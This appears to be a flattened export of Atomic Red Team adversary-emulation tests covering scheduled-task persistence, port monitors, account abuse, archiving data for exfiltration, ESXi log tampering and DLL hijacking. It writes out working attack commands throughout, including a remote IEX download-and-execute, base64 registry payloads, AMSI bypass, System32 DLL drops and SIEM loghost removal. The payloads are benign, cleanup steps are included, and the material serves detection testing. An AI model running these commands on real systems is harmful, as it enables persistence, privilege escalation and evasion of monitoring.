nodes.name: Scheduled Task/Job: Scheduled Task
nodes.description: Atomic Red Team technique: Scheduled Task/Job: Scheduled Task

nodes.name: Scheduled Task Startup Script
nodes.description: Run an exe on user logon or system startup. Upon execution, success messages will be displayed for the two scheduled tasks. To view the tasks, open the Task Scheduler and look in the Active Tasks pane.

nodes.name: windows
nodes.description: Supported platform: windows

nodes.name: Command for Scheduled Task Startup Script
nodes.description: schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe" schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"

nodes.name: Cleanup for Scheduled Task Startup Script
nodes.description: schtasks /delete /tn "T1053_005_OnLogon" /f >nul 2>&1 schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1

nodes.name: Scheduled task Local
nodes.description: Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.

nodes.name: Command for Scheduled task Local
nodes.description: SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}

nodes.name: Cleanup for Scheduled task Local
nodes.description: SCHTASKS /Delete /TN spawn /F >nul 2>&1

nodes.name: Scheduled task Remote
nodes.description: Create a task on a remote system. Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.

nodes.name: Command for Scheduled task Remote
nodes.description: SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}

nodes.name: Cleanup for Scheduled task Remote
nodes.description: SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1

nodes.name: Powershell Cmdlet Scheduled Task
nodes.description: Create an atomic scheduled task that leverages native powershell cmdlets. Upon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.

nodes.name: Command for Powershell Cmdlet Scheduled Task
nodes.description: $Action = New-ScheduledTaskAction -Execute "calc.exe" $Trigger = New-ScheduledTaskTrigger -AtLogon $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest $Set = New-ScheduledTaskSettingsSet $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask -InputObject $object

nodes.name: Cleanup for Powershell Cmdlet Scheduled Task
nodes.description: Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1

nodes.name: Task Scheduler via VBA
nodes.description: This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within 30 - 40 seconds after this module has run

nodes.name: Command for Task Scheduler via VBA
nodes.description: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"

nodes.name: Cleanup for Task Scheduler via VBA
nodes.description: Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false

nodes.name: WMI Invoke-CimMethod Scheduled Task
nodes.description: Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.

nodes.name: Command for WMI Invoke-CimMethod Scheduled Task
nodes.description: $xml = [System.IO.File]::ReadAllText("#{xml_path}") Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }

nodes.name: Cleanup for WMI Invoke-CimMethod Scheduled Task
nodes.description: Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1

nodes.name: Scheduled Task Executing Base64 Encoded Commands From Registry
nodes.description: A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created. The scheduled task will launch powershell to decode and run the command in the registry daily. This is a persistence mechanism recently seen in use by Qakbot. [Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)

nodes.name: Command for Scheduled Task Executing Base64 Encoded Commands From Registry
nodes.description: reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}

nodes.name: Cleanup for Scheduled Task Executing Base64 Encoded Commands From Registry
nodes.description: schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1 reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1

nodes.name: Base64 Encode/Decode Activity
nodes.description: Base64 encoding or decoding activity

nodes.name: Import XML Schedule Task with Hidden Attribute
nodes.description: Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. This technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.

nodes.name: Command for Import XML Schedule Task with Hidden Attribute
nodes.description: $xml = [System.IO.File]::ReadAllText("#{xml_path}") Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }

nodes.name: Cleanup for Import XML Schedule Task with Hidden Attribute
nodes.description: Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1

nodes.name: PowerShell Modify A Scheduled Task
nodes.description: Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. It will first be created to spawn cmd.exe, but modified to run notepad.exe. Upon successful execution, powershell.exe will create a scheduled task and modify the action.

nodes.name: Command for PowerShell Modify A Scheduled Task
nodes.description: $Action = New-ScheduledTaskAction -Execute "cmd.exe" $Trigger = New-ScheduledTaskTrigger -AtLogon $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest $Set = New-ScheduledTaskSettingsSet $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTaskModifed -InputObject $object $NewAction = New-ScheduledTaskAction -Execute "Notepad.exe" Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction

nodes.name: Cleanup for PowerShell Modify A Scheduled Task
nodes.description: Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1

nodes.name: Scheduled Task ("Ghost Task") via Registry Key Manipulation
nodes.description: Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means. This requires a download of the GhostTask binary, which must be run as NT Authority\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command. For further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).

nodes.name: Command for Scheduled Task ("Ghost Task") via Registry Key Manipulation
nodes.description: "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe" "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} add #{task_name} "cmd.exe" "/c #{task_command}" #{user_name} logon

nodes.name: Cleanup for Scheduled Task ("Ghost Task") via Registry Key Manipulation
nodes.description: "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe" "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul

nodes.name: Scheduled Task Persistence via CompMgmt.msc
nodes.description: Adds persistence by abusing `compmgmt.msc` via a scheduled task. When the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). This technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.

nodes.name: Command for Scheduled Task Persistence via CompMgmt.msc
nodes.description: reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f schtasks /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F ECHO Let's open the Computer Management console now... compmgmt.msc

nodes.name: Cleanup for Scheduled Task Persistence via CompMgmt.msc
nodes.description: reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f schtasks /Delete /TN "#{task_name}" /F

nodes.name: Scheduled Task Persistence via Eventviewer.msc
nodes.description: Adds persistence by abusing `eventviewer.msc` via a scheduled task. When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`).

nodes.name: Command for Scheduled Task Persistence via Eventviewer.msc
nodes.description: reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f schtasks /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F ECHO Let's run the schedule task ... schtasks /Run /TN "EventViewerBypass"

nodes.name: Cleanup for Scheduled Task Persistence via Eventviewer.msc
nodes.description: reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f schtasks /Delete /TN "#{task_name}" /F

nodes.name: Command for Delay execution with ping

nodes.name: powerShell Persistence via hijacking default modules - Get-Variable.exe
nodes.description: Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\Local\Microsoft\WindowsApps and names it Get-Variable.exe for Windows 10 and above. https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/

nodes.name: Command for powerShell Persistence via hijacking default modules - Get-Variable.exe
nodes.description: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:"$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" "PathToAtomicsFolder\T1574.008\bin\calc.cs" Powershell -noprofile

nodes.name: Cleanup for powerShell Persistence via hijacking default modules - Get-Variable.exe
nodes.description: Remove-Item "$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" -ErrorAction Ignore Stop-Process -Name "calculator"

nodes.name: Boot or Logon Autostart Execution: Port Monitors
nodes.description: Atomic Red Team technique: Boot or Logon Autostart Execution: Port Monitors

nodes.name: Add Port Monitor persistence in Registry
nodes.description: Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.

nodes.name: Command for Add Port Monitor persistence in Registry
nodes.description: reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "#{monitor_dll}" /t REG_SZ /f

nodes.name: Cleanup for Add Port Monitor persistence in Registry
nodes.description: reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1

nodes.name: Scheduled Task/Job: At
nodes.description: Atomic Red Team technique: Scheduled Task/Job: At

nodes.name: At.exe Scheduled task
nodes.description: Executes cmd.exe Note: deprecated in Windows 8+ Upon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.

nodes.name: Command for At.exe Scheduled task
nodes.description: at 13:20 /interactive cmd

nodes.name: At - Schedule a job
nodes.description: This test submits a command to be run in the future by the `at` daemon.

nodes.name: Command for At - Schedule a job
nodes.description: echo "#{at_command}" | at #{time_spec}

nodes.name: At - Schedule a job via kubectl in a Pod
nodes.description: Launches a short-lived Ubuntu pod, installs the `at` utility, starts the `atd` daemon, and submits a job with `at`. The pod is deleted after execution.

nodes.name: containers
nodes.description: Supported platform: containers

nodes.name: Command for At - Schedule a job via kubectl in a Pod
nodes.description: kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc "apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '#{at_command}' | at #{time_spec} && at -l"

nodes.name: System File Copied to Unusual Location
nodes.description: It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.

nodes.name: Command for System File Copied to Unusual Location
nodes.description: copy-item "$env:windir\System32\cmd.exe" -destination "$env:allusersprofile\cmd.exe" start-process "$env:allusersprofile\cmd.exe" sleep -s 5 stop-process -name "cmd" | out-null

nodes.name: Cleanup for System File Copied to Unusual Location
nodes.description: remove-item "$env:allusersprofile\cmd.exe" -force -erroraction silentlycontinue

nodes.name: Malware Masquerading and Execution from Zip File
nodes.description: When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)

nodes.name: Command for Malware Masquerading and Execution from Zip File
nodes.description: Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\T1036.zip" -DestinationPath "$env:userprofile\Downloads\T1036" -Force cd "$env:userprofile\Downloads\T1036" cmd /c "$env:userprofile\Downloads\T1036\README.cmd" >$null 2>$null

nodes.name: Cleanup for Malware Masquerading and Execution from Zip File
nodes.description: taskkill /IM Calculator.exe /f >$null 2>$null Remove-Item "$env:userprofile\Downloads\T1036" -recurse -ErrorAction Ignore

nodes.name: Create local account (Linux)
nodes.description: An adversary may wish to create an account with admin privileges to work with. In this test we create a "art" user with the password art, switch to art, execute whoami, exit and delete the art user.

nodes.name: Command for Create local account (Linux)
nodes.description: password=$(openssl passwd -1 art) ([ "$(uname)" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) su art -c "whoami; exit"

nodes.name: Cleanup for Create local account (Linux)
nodes.description: [ "$(uname)" = 'Linux' ] && userdel art -rf || rmuser -y art

nodes.name: Reactivate a locked/expired account (Linux)
nodes.description: A system administrator may have locked and expired a user account rather than deleting it. "the user is coming back, at some stage" An adversary may reactivate a inactive account in an attempt to appear legitimate. In this test we create a "art" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.

nodes.name: Command for Reactivate a locked/expired account (Linux)
nodes.description: useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art usermod --lock art usermod --expiredate "1" art usermod --unlock art usermod --expiredate "99999" art su -c whoami art

nodes.name: Cleanup for Reactivate a locked/expired account (Linux)
nodes.description: userdel -r art

nodes.name: Reactivate a locked/expired account (FreeBSD)
nodes.description: A system administrator may have locked and expired a user account rather than deleting it. "the user is coming back, at some stage" An adversary may reactivate a inactive account in an attempt to appear legitimate. In this test we create a "art" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.

nodes.name: Command for Reactivate a locked/expired account (FreeBSD)
nodes.description: pw useradd art -g wheel -s /bin/sh echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 pw lock art pw usermod art -e +1d pw unlock art pw user mod art -e +99d su art whoami exit

nodes.name: Cleanup for Reactivate a locked/expired account (FreeBSD)
nodes.description: rmuser -y art

nodes.name: Login as nobody (Linux)
nodes.description: An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`

nodes.name: Command for Login as nobody (Linux)
nodes.description: cat /etc/passwd |grep nobody chsh --shell /bin/bash nobody usermod --password $(openssl passwd -1 nobody) nobody su -c "whoami" nobody

nodes.name: Cleanup for Login as nobody (Linux)
nodes.description: chsh --shell /usr/sbin/nologin nobody cat /etc/passwd |grep nobody # -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

nodes.name: Byte-level File Combination
nodes.description: Combining file contents or byte streams into a new file

nodes.name: Login as nobody (freebsd)
nodes.description: An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin`

nodes.name: Command for Login as nobody (freebsd)
nodes.description: cat /etc/passwd |grep nobody pw usermod nobody -s /bin/sh echo $(openssl passwd -1 art) | pw mod user nobody -h 0 su nobody whoami exit

nodes.name: Cleanup for Login as nobody (freebsd)
nodes.description: pw usermod nobody -s /usr/sbin/nologin cat /etc/passwd |grep nobody # -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin

nodes.name: Use PsExec to elevate to NT Authority\SYSTEM account
nodes.description: PsExec is a powerful tool most known for its remote management capability. However, it can also be used to run processes as the local system account. The local system account is a default windows account which has unrestricted access to all system resources. Upon successful execution, PsExec.exe will spawn a command prompt which will run 'whoami' as the local system account and then exit.

nodes.name: Command for Use PsExec to elevate to NT Authority\SYSTEM account
nodes.description: "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula -s %COMSPEC% /c whoami

nodes.name: Archive Collected Data: Archive via Utility
nodes.description: Atomic Red Team technique: Archive Collected Data: Archive via Utility

nodes.name: Compress Data for Exfiltration With Rar
nodes.description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. When the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory

nodes.name: Command for Compress Data for Exfiltration With Rar
nodes.description: "#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}

nodes.name: Cleanup for Compress Data for Exfiltration With Rar
nodes.description: del /f /q /s #{output_file} >nul 2>&1

nodes.name: Compress Data and lock with password for Exfiltration with winrar
nodes.description: Note: Requires winrar installation rar a -p"blue" hello.rar (VARIANT)

nodes.name: Command for Compress Data and lock with password for Exfiltration with winrar
nodes.description: mkdir .\tmp\victim-files cd .\tmp\victim-files echo "This file will be encrypted" > .\encrypted_file.txt "#{rar_exe}" a -hp"blue" hello.rar dir

nodes.name: Compress Data and lock with password for Exfiltration with winzip
nodes.description: Note: Requires winzip installation wzzip sample.zip -s"blueblue" *.txt (VARIANT)

nodes.name: Command for Compress Data and lock with password for Exfiltration with winzip
nodes.description: path=%path%;"C:\Program Files (x86)\winzip" mkdir .\tmp\victim-files cd .\tmp\victim-files echo "This file will be encrypted" > .\encrypted_file.txt "#{winzip_exe}" -min -a -s"hello" archive.zip * dir

nodes.name: Compress Data and lock with password for Exfiltration with 7zip
nodes.description: Note: This test requires 7zip installation

nodes.name: Command for Compress Data and lock with password for Exfiltration with 7zip
nodes.description: mkdir $PathToAtomicsFolder\T1560.001\victim-files cd $PathToAtomicsFolder\T1560.001\victim-files echo "This file will be encrypted" > .\encrypted_file.txt "#{7zip_exe}" u archive.7z *txt -pblue dir

nodes.name: Cleanup for Compress Data and lock with password for Exfiltration with 7zip
nodes.description: rmdir /s /Q $PathToAtomicsFolder\T1560.001\victim-files >nul 2>&1

nodes.name: Data Compressed - nix - zip
nodes.description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.

nodes.name: Command for Data Compressed - nix - zip
nodes.description: zip #{output_file} #{input_files}

nodes.name: Cleanup for Data Compressed - nix - zip
nodes.description: rm -f #{output_file}

nodes.name: Data Compressed - nix - gzip Single File
nodes.description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.

nodes.name: Command for Data Compressed - nix - gzip Single File
nodes.description: test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})

nodes.name: Cleanup for Data Compressed - nix - gzip Single File
nodes.description: rm -f #{input_file}.gz

nodes.name: Data Compressed - nix - tar Folder or File
nodes.description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.

nodes.name: Command for Data Compressed - nix - tar Folder or File
nodes.description: tar -cvzf #{output_file} #{input_file_folder}

nodes.name: Cleanup for Data Compressed - nix - tar Folder or File
nodes.description: rm -f #{output_file}

nodes.name: Archive Creation
nodes.description: Creation of archive files such as tar

nodes.name: Data Encrypted with zip and gpg symmetric
nodes.description: Encrypt data for exiltration

nodes.name: Command for Data Encrypted with zip and gpg symmetric
nodes.description: mkdir -p #{test_folder} cd #{test_folder}; touch a b c d e f g zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./* echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip ls -l #{test_folder}

nodes.name: Cleanup for Data Encrypted with zip and gpg symmetric
nodes.description: rm -Rf #{test_folder}

nodes.name: Encrypts collected data with AES-256 and Base64
nodes.description: An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. This atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. In this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data. https://attack.mitre.org/versions/v7/software/S0267/

nodes.name: Command for Encrypts collected data with AES-256 and Base64
nodes.description: zip -r #{input_folder}/#{input_file}.zip #{input_folder} openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc cat #{input_folder}/#{input_file}.enc | base64

nodes.name: Cleanup for Encrypts collected data with AES-256 and Base64
nodes.description: rm -rf #{input_folder}

nodes.name: ESXi - Remove Syslog remote IP
nodes.description: An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.

nodes.name: Command for ESXi - Remove Syslog remote IP
nodes.description: # Extract line with IP address from the syslog configuration output #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt # Replace the IP with "0" #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt # Extract the IP from the line extracted from findstr $inputFilePath = "c:\temp\loghost.txt" $outputFilePath = "c:\temp\loghost_ip.txt" $fileContent = Get-Content -Path $inputFilePath -Raw if ([string]::IsNullOrWhiteSpace($fileContent)) { Write-Host "The content is $fileContent" Write-Host "The file is empty" } else { # Use a regular expression to extract IP addresses $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value $output = "esxcli system syslog config set --loghost=" + $ipAddresses $output | Out-File -FilePath $outputFilePath -Encoding ascii Write-Host "IP addresses extracted and saved to $outputFilePath" }

nodes.name: Cleanup for ESXi - Remove Syslog remote IP
nodes.description: # Re-add the initially extracted IP #{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\temp\loghost_ip.txt rm c:\temp\loghost_ip.txt rm c:\temp\loghost.txt

nodes.name: Compress a File for Exfiltration using Makecab
nodes.description: An adversary may compress data using Makecab (in-built Windows binary) that is collected prior to exfiltration. [reference](https://unit42.paloaltonetworks.com/exchange-server-credential-harvesting/)

nodes.name: Command for Compress a File for Exfiltration using Makecab
nodes.description: makecab.exe #{input_file} #{output_file}

nodes.name: Cleanup for Compress a File for Exfiltration using Makecab
nodes.description: del #{output_file}

nodes.name: Copy and Compress AppData Folder
nodes.description: Copies the AppData folder, compresses it, and cleans up temporary files.

nodes.name: Command for Copy and Compress AppData Folder
nodes.description: $AppData="$env:USERPROFILE\AppData" $Copy="#{destination_folder}" $Zip="#{zip_file_path}" if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force } New-Item -ItemType Directory -Path $Copy | Out-Null Get-ChildItem $AppData -Recurse -Force | ForEach-Object { $rel = $_.FullName.Substring($AppData.Length + 1) $dest = Join-Path $Copy $rel if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null } else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue } } Add-Type -AssemblyName System.IO.Compression.FileSystem [System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)

nodes.name: Hijack Execution Flow: DLL
nodes.description: Atomic Red Team technique: Hijack Execution Flow: DLL

nodes.name: DLL Search Order Hijacking - amsi.dll
nodes.description: Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface) https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/ Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.

nodes.name: Command for DLL Search Order Hijacking - amsi.dll
nodes.description: copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll %APPDATA%\updater.exe -Command exit

nodes.name: Cleanup for DLL Search Order Hijacking - amsi.dll
nodes.description: del %APPDATA%\updater.exe >nul 2>&1 del %APPDATA%\amsi.dll >nul 2>&1

nodes.name: Phantom Dll Hijacking - WinAppXRT.dll
nodes.description: .NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS Setting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\windows\system32 (or any other location accessible via PATH) will ensure the WinAppXRT.dll is loaded everytime user launches an application using .NET. Upon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application.

nodes.name: Command for Phantom Dll Hijacking - WinAppXRT.dll
nodes.description: copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll ren %APPDATA%\amsi.dll WinAppXRT.dll copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f

nodes.name: Cleanup for Phantom Dll Hijacking - WinAppXRT.dll
nodes.description: reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f del %windir%\System32\WinAppXRT.dll del %APPDATA%\WinAppXRT.dll

nodes.name: Phantom Dll Hijacking - ualapi.dll
nodes.description: Re-starting the Print Spooler service leads to C:\Windows\System32\ualapi.dll being loaded A malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts Upon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart. Print Spooler service is also configured to auto start. Reboot of system is required

nodes.name: Command for Phantom Dll Hijacking - ualapi.dll
nodes.description: copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll ren %APPDATA%\amsi.dll ualapi.dll copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll sc config Spooler start=auto

nodes.name: Cleanup for Phantom Dll Hijacking - ualapi.dll
nodes.description: del %windir%\System32\ualapi.dll del %APPDATA%\ualapi.dll

nodes.name: DLL Side-Loading using the Notepad++ GUP.exe binary
nodes.description: GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded. Upon execution, calc.exe will be opened.

nodes.name: Command for DLL Side-Loading using the Notepad++ GUP.exe binary
nodes.description: "#{gup_executable}"

nodes.name: Cleanup for DLL Side-Loading using the Notepad++ GUP.exe binary
nodes.description: taskkill /F /IM #{process_name} >nul 2>&1

nodes.name: Remote File Download
nodes.description: Download of a remote file or payload

nodes.name: DLL Side-Loading using the dotnet startup hook environment variable
nodes.description: Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)

nodes.name: Command for DLL Side-Loading using the dotnet startup hook environment variable
nodes.description: set DOTNET_STARTUP_HOOKS="#{preloader_dll}" dotnet -h > nul echo.

nodes.name: Cleanup for DLL Side-Loading using the dotnet startup hook environment variable
nodes.description: taskkill /F /IM #{process_name} >nul 2>&1

nodes.name: DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
nodes.description: Various threat actors and malware have been found side loading a masqueraded "KeyScramblerIE.dll" through "KeyScrambler.exe", which can load further executables embedded in modified KeyScramblerIE.dll file.

nodes.name: Command for DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
nodes.description: Write-Host 1.Downloading KeyScrambler from official website to temp directory Invoke-WebRequest -Uri "https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe" -OutFile $env:Temp\KeyScrambler_Setup.exe Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp Copy-Item "C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe" -Destination $env:TEMP\KeyScrambler.exe Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup Start-Process -FilePath $env:Temp\KeyScrambler.exe Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker

